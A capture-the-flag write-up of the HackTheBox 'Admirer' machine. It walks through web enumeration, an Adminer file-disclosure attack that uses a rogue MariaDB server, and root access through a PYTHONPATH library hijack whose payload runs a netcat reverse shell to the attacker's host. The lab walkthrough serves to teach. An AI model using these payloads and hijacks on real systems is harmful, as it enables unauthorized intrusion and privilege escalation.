---
title: "HackTheBox — Admirer Writeup"
date: 2020-09-30 13:00:00 +0530
categories: [HackTheBox,Linux Machines]
tags: [admirer,adminer,ffuf,MariaDB,mysql,setenv,pythonpath,souce-code,mysql,credentials,sudo,path-hijack,python-library-hijack,ctf]
image: /assets/img/Posts/Admirer.png
---

> Admirer is an easy box with bunch of rabbit holes where usual enumeration workflow doesn't work forcing us think out of the box and gather initial data. We'll start with web-recon where will find FTP credentials, inside FTP share we'll discover an outdated source code of the website leading us enumerate further and discover an vulnerable version of Adminer Web Interface running on Box allowing us to read local files on the server, where we'll read current source of the page, get credentials which works for SSH access. For elevating privilege to root we'll abuse sudo privilege allowing us to set up an environment variable and execute a script, leading to Python Library hijack and get RCE as root.

## Reconnaissance

Let's begin with `masscan` to discover open ports:

```shell
cfx:  ~/Documents/htb
→ masscan -e tun0 -p0-65535 --max-rate 500 10.10.10.187 | tee masscan-alltcp

Starting masscan 1.0.5 (http://bit.ly/14GZzcT) at 2020-09-28 10:24:21 GMT
 -- forced options: -sS -Pn -n --randomize-hosts -v --send-eth
Initiating SYN Stealth Scan
Scanning 1 hosts [65536 ports/host]
Discovered open port 21/tcp on 10.10.10.187
Discovered open port 22/tcp on 10.10.10.187
Discovered open port 80/tcp on 10.10.10.187
```

I'll use `tee` to save the output in a file, `masscan` output shows ports `21,22 & 80` are open. Let's enumerate these ports using `nmap` to find out their services.
Before running nmap scan we'll make use of some bash commands:

```shell
cfx:  ~/Documents/htb/admirer
→ cat masscan-alltcp | grep tcp | sed 's/Discovered open port //' | awk -F/ '{print $1}' ORS=','
21,22,80,

cfx:  ~/Documents/htb/admirer
→ nmap -sC -sV -p21,22,80 10.10.10.187 -oN nmap-enum
Starting Nmap 7.80 ( https://nmap.org ) at 2020-09-28 18:03 IST
Nmap scan report for 10.10.10.187
Host is up (0.29s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u7 (protocol 2.0)
| ssh-hostkey:
|   2048 4a:71:e9:21:63:69:9d:cb:dd:84:02:1a:23:97:e1:b9 (RSA)
|   256 c5:95:b6:21:4d:46:a4:25:55:7a:87:3e:19:a8:e7:02 (ECDSA)
|_  256 d0:2d:dd:d0:5c:42:f8:7b:31:5a:be:57:c4:a9:a7:56 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
| http-robots.txt: 1 disallowed entry
|_/admin-dir
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Admirer
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.67 seconds
```

Services running on Port 21,22 and 80 are FTP, SSH and HTTP respectively. On port 21 an FTP service is running but nmap didn't output if anonymous login is allowed so for now we will move ahead with other ports enumeration.

### Port 80 - HTTP

Nmap output detects `robots.txt` on the site with an disallowed entry for `/admin-dir`, On visiting <http://10.10.10.187> a website with multiple images is shown:

![website](/assets/img/Posts/Admirer/website.png)

Let's run `ffuf` against this site to discover hidden files and directories:

```shell
cfx:  ~/Documents/htb/admirer
→ ffuf -c -r -u http://10.10.10.187/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -e .txt,.php -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.187/FUZZ
 :: Extensions       : .txt .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

index.php               [Status: 200, Size: 6051, Words: 385, Lines: 154]
robots.txt              [Status: 200, Size: 138, Words: 21, Lines: 5]
:: Progress: [60348/60348] :: Job [1/1] :: 99 req/sec :: Duration: [0:10:05] :: Errors: 0 ::
```
Looking at the output nothing interesting is discovered except for `robots.txt` which was mentioned in nmap output as well, Looking at the `robots.txt`:

```shell
cfx:  ~/Documents/htb/admirer
→ curl http://10.10.10.187/robots.txt
User-agent: *

# This folder contains personal contacts and creds, so no one -not even robots- should see it - waldo
Disallow: /admin-dir
```
Clearly It hints us to check `/admin-dir`, also we'll note `waldo` as an potential username for now.

On checking <http://10.10.10.187admin-dir> but we a 403, so indexing is disabled but it doesn't mean we can't fuzz the directory for hidden files, let's run `ffuf` on the `/admin-dir` directory to check if can find something interesting:

```shell
cfx:  ~/Documents/htb/admirer
→ ffuf -c -r -u http://10.10.10.187/admin-dir/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -e .txt,.php -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.187/admin-dir/FUZZ
 :: Extensions       : .txt .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

contacts.txt            [Status: 200, Size: 350, Words: 19, Lines: 30]
credentials.txt         [Status: 200, Size: 136, Words: 5, Lines: 12]
:: Progress: [60348/60348] :: Job [1/1] :: 182 req/sec :: Duration: [0:05:31] :: Errors: 0 ::
```

As mentioned in `robots.txt`, we do find `contacts.txt` and `credentails.txt` inside `\admin-dir`

Looking at the `contacts.txt` file we have some email addresses and potential usernames:

```shell
cfx:  ~/Documents/htb/admirer
→ curl http://10.10.10.187/admin-dir/contacts.txt

##########
# admins #
##########
# Penny
Email: p.wise@admirer.htb


##############
# developers #
##############
# Rajesh
Email: r.nayyar@admirer.htb

# Amy
Email: a.bialik@admirer.htb

# Leonard
Email: l.galecki@admirer.htb



#############
# designers #
#############
# Howard
Email: h.helberg@admirer.htb

# Bernadette
Email: b.rauch@admirer.htb
```

On `credentials.txt` we discover some creds:

```python
cfx:  ~/Documents/htb/admirer
→ curl http://10.10.10.187/admin-dir/credentials.txt
[Internal mail account]
w.cooper@admirer.htb
fgJr6q#S\W:$P

[FTP account]
ftpuser
%n?4Wz}R$tTF7

[Wordpress account]
admin
w0rdpr3ss01!
```

### Port 21 - FTP Access

Now that we have credentials for FTP, let try to access FTP:

```shell
cfx:  ~/Documents/htb/admirer
→ ftp 10.10.10.187
Connected to 10.10.10.187.
220 (vsFTPd 3.0.3)
Name (10.10.10.187:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> bin
200 Switching to Binary mode.
ftp> dir
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            3405 Dec 02  2019 dump.sql
-rw-r--r--    1 0        0         5270987 Dec 03  2019 html.tar.gz
226 Directory send OK.
```

Inside FTP we find `dump.sql` and `html.tar.gz`, lets download them to our machine and analyse further:

```shell
ftp> get dump.sql
local: dump.sql remote: dump.sql
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for dump.sql (3405 bytes).
226 Transfer complete.
3405 bytes received in 0.00 secs (2.9628 MB/s)
ftp> get html.tar.gz
local: html.tar.gz remote: html.tar.gz
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for html.tar.gz (5270987 bytes).
226 Transfer complete.
5270987 bytes received in 16.02 secs (321.3846 kB/s)
```

`dump.sql` contains tables for the images displayed on the site, nothing interesting except database name `admirerdb` and it being served on localhost

### Analysing Website Source

Extracting the website source `html.tar.gz`:

```shell
cfx:  ~/Documents/htb/admirer/ftp
→ mkdir html

cfx:  ~/Documents/htb/admirer/ftp
→ tar -xvzf html.tar.gz --directory=html/

cfx:  ~/Documents/htb/admirer/ftp/html
→ ls
assets  images  index.php  robots.txt  utility-scripts  w4ld0s_s3cr3t_d1r
```
We have the following:

- `assets` and `images` directory contains css files and images of the website.

- The contents of `index.php` seems similar to website's source with additional connection information for the database:
```shell
    <?php
        $servername = "localhost";
        $username = "waldo";
        $password = "]F7jLHw:*G>UPrTo}~A"d6b";
        $dbname = "admirerdb";

        // Create connection
        $conn = new mysqli($servername, $username, $password, $dbname);
```
- There is also one more directory `utility-scripts` containing some PHP files:

```shell
cfx:  ~/Documents/htb/admirer/ftp/html/utility-scripts
→ ls
admin_tasks.php  db_admin.php  info.php  phptest.php
```
On visiting each of these files on the website and reading the contents we have gathered the following facts:

- `admin_tasks.php` located at <http://10.10.10.187/utility-scripts/admin_tasks.php> is some kind of panel used to perform the following operations:

```shell
Available options:
           1) View system uptime
           2) View logged in users
           3) View crontab (current user only)
           4) Backup passwd file (not working)
           5) Backup shadow file (not working)
           6) Backup web data (not working)
           7) Backup database (not working)

           NOTE: Options 4-7 are currently NOT working because they need root privileges.
```
On the website we are able to perform the first 3 tasks whereas the other 4-7 backup tasks can only performed with root privileges.

- `info.php` is the the PHP info page
- `phptest.php` is a dummy PHP page
- `db_admin.php` gives us db credentials for the same user `waldo` we saw inside `index.php` but the passwords are different.
```shell
cfx:  ~/Documents/htb/admirer/ftp/html/utility-scripts
→ cat db_admin.php
<?php
  $servername = "localhost";
  $username = "waldo";
  $password = "Wh3r3_1s_w4ld0?";

  // Create connection
  $conn = new mysqli($servername, $username, $password);

  // Check connection
  if ($conn->connect_error) {
      die("Connection failed: " . $conn->connect_error);
  }
  echo "Connected successfully";


  // TODO: Finish implementing this or find a better open source alternative
?>
```
We are able to visit other 3 files on the site except `db_admin.php` which returns 404.

The comment inside `db_admin.php` says to `TODO: Finish implementing this or find a better open source alternative`, maybe the reason why we are getting 404 is that the dev found an open source alternative. With that thought I decided to fuzz this directory using `ffuf` hoping to find something:

```shell
cfx:  ~/Documents/htb/admirer
→ ffuf -c -r -u http://10.10.10.187/utility-scripts/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-small-directories.txt -e .txt,.php -fc 403

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.0.2
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.10.187/utility-scripts/FUZZ
 :: Extensions       : .txt .php
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response status: 403
________________________________________________

info.php                [Status: 200, Size: 83802, Words: 4024, Lines: 962]
phptest.php             [Status: 200, Size: 32, Words: 8, Lines: 1]
adminer.php             [Status: 200, Size: 4158, Words: 189, Lines: 52]
:: Progress: [60348/60348] :: Job [1/1] :: 176 req/sec :: Duration: [0:05:42] :: Errors: 0 ::
```

Bingo! We found an additional page `adminer.php`

>Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consist of a single file ready to deploy to the target server. Adminer is available for MySQL, MariaDB, PostgreSQL, SQLite, MS SQL, Oracle, Firebird, SimpleDB, Elasticsearch and MongoDB.

## Adminer Exploitation

On accessing <http://10.10.10.187/utility-scripts/adminer.php> we find the login page:

![website1](/assets/img/Posts/Admirer/website1.png)

I tried to login with the credentials discovered earlier for user waldo but none of them worked.

### Exploit

Looking at the version `adminer 4.6.2`, a quick google search revealed version Adminer 4.6.2 is vulnerable to file disclosure [**vulnerability]**(https://www.acunetix.com/vulnerabilities/web/adminer-4-6-2-file-disclosure-vulnerability/)

Below two articles can be referred to understand how the Exploitation works in detail:

- <https://medium.com/bugbountywriteup/adminer-script-results-to-pwning-server-private-bug-bounty-program-fe6d8a43fe6f>
- <https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool>

Bottom-line is we cannot to any database on Admirer but the same time we can host a database on our machine and access it remotely from Adminer.

### Attack Scenario

- Setup a MySQL server on Attacking machine
- Access database from Adminer
- Reading localfiles using and inserting the content into table using:
```shell
LOAD DATA LOCAL INFILE '/etc/passwd'
INTO TABLE test.test
FIELDS TERMINATED BY "\n"
```

### MySQL Setup

We'll host a MariaDB instance using the following commands, I have added comments against each command to understand its usage:

```shell
cfx:  ~/Documents/htb/admirer
→ service mysql start      #Start MySQL service

cfx:  ~/Documents/htb/admirer
→ mysql -u root                             #Login MySQL
Welcome to the MariaDB monitor.  Commands end with ; or \g.
Your MariaDB connection id is 51
Server version: 10.3.24-MariaDB-2 Debian build-unstable

Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

MariaDB [(none)]> CREATE DATABASE reverseshell;       #Creating a new database
Query OK, 1 row affected (0.000 sec)

MariaDB [(none)]> CREATE USER 'cfx'@'%' IDENTIFIED BY 'coldfusionx'; #Creating user cfx:coldfusionx {username:password}
Query OK, 0 rows affected (0.046 sec)

MariaDB [(none)]> GRANT ALL PRIVILEGES ON *.* TO 'cfx'@'%'; #Granting user cfx privileges to access everything
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> FLUSH PRIVILEGES;   #Refresh Privileges of User
Query OK, 0 rows affected (0.000 sec)

MariaDB [(none)]> USE reverseshell; #Changing database to reverseshell
Database changed
MariaDB [reverseshell]> CREATE TABLE shell (data VARCHAR(255));  #Creating a table named shell
Query OK, 0 rows affected (0.081 sec)

MariaDB [reverseshell]> exit
Bye
```
Next, to allow remote connections to our MariaDB instance we need to change the `bind-address` value.

By default MariaDB listens on 127.0.0.1:3306, Inside `/etc/mysql/mariadb.conf.d/50-server.cnf` we change the value of bind-address to 0.0.0.0 and restart MySQL service:

```shell
# Instead of skip-networking the default is now to listen only on
# localhost which is more compatible and is not less secure.
bind-address            = 0.0.0.0 #127.0.0.1

cfx:  ~/Documents/htb/admirer
→ service mysql restart  #Restart MySQL service

```
### Reading Files

We can now login using our creds:

![exp](/assets/img/Posts/Admirer/exp.png)

After successful login we see our table `shell`

![exp1](/assets/img/Posts/Admirer/exp1.png)

Next, I selected `SQL command` and tried the query mentioned in exploit to insert `/etc/passwd` into our table but got presented with the below error:

![error](/assets/img/Posts/Admirer/error.png)

Looking at the error it seems the query will only accept files from `open_basedir`, Inside PHP info located at <http://10.10.10.187/utility-scripts/info.php> I found the `open_basedir` directory is `/var/www/html`

![phpinfo](/assets/img/Posts/Admirer/info.png)

Then I executed the following payload with `/var/www/html` trying to insert `index.php` into the table of our DATABASE.

```shell
LOAD DATA LOCAL INFILE '/var/www/html/index.php'
INTO TABLE reverseshell.shell
FIELDS TERMINATED BY "\n"
```
![success](/assets/img/Posts/Admirer/success.png)

Great ! It worked, we can now view the content of `index.php` from our table by selecting `shell` to view the table and then click on `select data` to view the contents of `index.php`

![data](/assets/img/Posts/Admirer/data.png)

Alternatively, viewing the contents of `index.php` could also be achieved by using the following command on our Maria DB instance:

```shell
MariaDB [reverseshell]> SELECT * from shell;
+---------------------------------------------------------------------------------------------------------------------------------+
| data                                                                                                                            |
+---------------------------------------------------------------------------------------------------------------------------------+
| <!DOCTYPE HTML>                                                                                                                 |
| <!--                                                                                                                            |
|       Multiverse by HTML5 UP                                                                                                         |
|       html5up.net | @ajlkn                                                                                                           |
|       Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)                                           |
| -->                                                                                                                             |
| <html>                                                                                                                          |
|       <head>                                                                                                                         |
|               <title>Admirer</title>                                                                                                        |
|               <meta charset="utf-8" /
[..SNIP..]                                                                           |
|                         $servername = "localhost";                                                                              |
|                         $username = "waldo";                                                                                    |
|                         $password = "&<h5b~yK3F#{PaPB&dA}{H>";                                                                  |
|                         $dbname = "admirerdb";                                                                                  |
|                                                                                                                                 |
|                         // Create connection                                                                                    |
|                         $conn = new mysqli($servername, $username, $password, $dbname);                                         |
```
Finally, inside `index.php` we find another set of credentials as `waldo:&<h5b~yK3F#{PaPB&dA}{H>`

I tested these credentials for SSH using crackmapexec and it worked:

```shell
cfx:  ~/Documents/htb/admirer
→ crackmapexec ssh 10.10.10.187 -u waldo -p '&<h5b~yK3F#{PaPB&dA}{H>'
SSH         10.10.10.187    22     10.10.10.187     [*] SSH-2.0-OpenSSH_7.4p1 Debian-10+deb9u7
SSH         10.10.10.187    22     10.10.10.187     [+] waldo:&<h5b~yK3F#{PaPB&dA}{H>
```

## Shell as Waldo

Let's SSH into the server using above credentials and grab the user flag:

```shell
cfx:  ~/Documents/htb/admirer
→ ssh waldo@10.10.10.187
The authenticity of host '10.10.10.187 (10.10.10.187)' can't be established.
ECDSA key fingerprint is SHA256:NSIaytJ0GOq4AaLY0wPFdPsnuw/wBUt2SvaCdiFM8xI.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.10.187' (ECDSA) to the list of known hosts.
waldo@10.10.10.187's password:
Linux admirer 4.9.0-12-amd64 x86_64 GNU/Linux

The programs included with the Devuan GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Devuan GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Wed Apr 29 10:56:59 2020 from 10.10.14.3
waldo@admirer:~$ id
uid=1000(waldo) gid=1000(waldo) groups=1000(waldo),1001(admins)
waldo@admirer:~$ ls -la
total 28
drwxr-x--- 3 waldo waldo 4096 Apr 29 11:18 .
drwxr-xr-x 9 root  root  4096 Dec  2  2019 ..
lrwxrwxrwx 1 waldo waldo    9 Nov 29  2019 .bash_history -> /dev/null
-rw-r--r-- 1 waldo waldo  220 Nov 29  2019 .bash_logout
-rw-r--r-- 1 waldo waldo 3526 Nov 29  2019 .bashrc
lrwxrwxrwx 1 waldo waldo    9 Dec  2  2019 .lesshst -> /dev/null
lrwxrwxrwx 1 waldo waldo    9 Nov 29  2019 .mysql_history -> /dev/null
drwxr-xr-x 2 waldo waldo 4096 Apr 29 10:57 .nano
-rw-r--r-- 1 waldo waldo  675 Nov 29  2019 .profile
-rw-r----- 1 root  waldo   33 Sep 28 11:11 user.txt
waldo@admirer:~$ cat user.txt
9d59ec570c9ca1f*****************
```
## Elevating privilege: waldo -> root

### Enumeration

Running `sudo -l`, we see user waldo is able to run `/opt/scripts/admin_tasks.sh` script as the root user by setting up the environment variable

```shell
waldo@admirer:~$ sudo -l
[sudo] password for waldo:
Matching Defaults entries for waldo on admirer:
    env_reset, env_file=/etc/sudoenv, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, listpw=always

User waldo may run the following commands on admirer:
    (ALL) SETENV: /opt/scripts/admin_tasks.sh
```

### Scripts Review

Inside `/opt/scripts/` we discover two files `admin_tasks.sh` & `backup.py`

```shell
waldo@admirer:/opt/scripts$ ls -la
total 16
drwxr-xr-x 2 root admins 4096 Dec  2  2019 .
drwxr-xr-x 3 root root   4096 Nov 30  2019 ..
-rwxr-xr-x 1 root admins 2613 Dec  2  2019 admin_tasks.sh
-rwxr----- 1 root admins  198 Dec  2  2019 backup.py
```

Looking at the `admin_tasks.sh` script, we see it calls `backup.py` script located in the same directory.

```shell
backup_web()
{
    if [ "$EUID" -eq 0 ]
    then
        echo "Running backup script in the background, it might take a while..."
        /opt/scripts/backup.py &
    else
        echo "Insufficient privileges to perform the selected operation."
    fi
}
```
We already know we can execute `admin_tasks.sh` using sudo command, looking at the permissions it's possible to read the contents of `backup.py` since we are members of `admins` group, so let's take a look at `backup.py`:

```shell
waldo@admirer:/opt/scripts$ cat backup.py
#!/usr/bin/python3

from shutil import make_archive

src = '/var/www/html/'

# old ftp directory, not used anymore
#dst = '/srv/ftp/html'

dst = '/var/backups/html'

make_archive(dst, 'gztar', src)
```
Basically, `backup.py` imports `make_archive()` function from a python library named `shutil`

### Python Library Hijacking

I found this [**post**](https://rastating.github.io/privilege-escalation-via-python-library-hijacking/) which helped me to understand Python library hijacking.

So here we will create a python script named `shutil.py` and make use of `$PYTHONPATH` environment variable to call out `shutil.py` from our directory instead of original Python library directory.

> `$PYTHONPATH` - It has a role similar to PATH. This variable tells the Python interpreter where to locate the module files imported into a program. It should include the Python source library directory and the directories containing Python source code. PYTHONPATH is sometimes pre-set by the Python installer.

Creating a script named `shutil.py` inside `/dev/shm` Since, `make_archive()` function from `backup.py` takes three arguments, we will also call three dummy arguments inside our `make_archive()` function and using `os` module add a system call to execute `nc` for a reverse shell:

`shutil.py` inside `/dev/shm/`:

```shell
waldo@admirer:/opt/scripts$ cat /dev/shm/shutil.py
import os
def make_archive(c,f,x):
    os.system("nc 10.10.14.15 8020 -e /bin/bash")
```

### Root Shell

As our malicious script is ready let's execute it by setting up `$PYTHONPATH` environment variable as `/dev/shm/` and run `admin_tasks.sh`. Select Option 6 to execute `backup.py` script:

```shell
waldo@admirer:/opt/scripts$ sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
[sudo] password for waldo:

[[[ System Administration Menu ]]]
1) View system uptime
2) View logged in users
3) View crontab
4) Backup passwd file
5) Backup shadow file
6) Backup web data
7) Backup DB
8) Quit
Choose an option: 6
Running backup script in the background, it might take a while...
```

Getting a call back on our `pwncat` listener as root:

```shell
cfx:  ~/Documents/htb/admirer
→ pwncat -l 8020 -vv
INFO: Listening on :::8020 (family 10/IPv6, TCP)
INFO: Listening on 0.0.0.0:8020 (family 2/IPv4, TCP)
INFO: Client connected from 10.10.10.187:48958 (family 2/IPv4, TCP)
id
uid=0(root) gid=0(root) groups=0(root)
pwd
/opt/scripts
cd /root
cat root.txt
ef8873650e34bd1*****************
which python
/usr/bin/python
python -c "import pty;pty.spawn('/bin/bash')"
root@admirer:~# whoami
whoami
root
```
And we pwned the Box !

Thanks for reading, Suggestions & Feedback are appreciated !
